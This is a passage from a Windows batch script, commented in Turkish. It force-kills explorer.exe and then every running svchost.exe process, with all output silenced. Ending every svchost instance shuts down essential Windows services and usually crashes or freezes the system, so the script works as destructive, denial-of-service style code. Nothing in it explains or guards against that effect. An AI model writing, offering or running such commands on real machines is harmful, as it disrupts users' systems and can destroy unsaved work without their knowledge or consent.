...
:: explorer.exe varsa sonlandir
for /f "tokens=2" %%i in ('tasklist ^| find "explorer.exe"') do taskkill /f /pid %%i >nul 2>&1

:: tum svchost.exe islemlerini sonlandir
for /f "tokens=2" %%i in ('tasklist ^| find "svchost.exe"') do taskkill /f /pid %%i >nul 2>&1
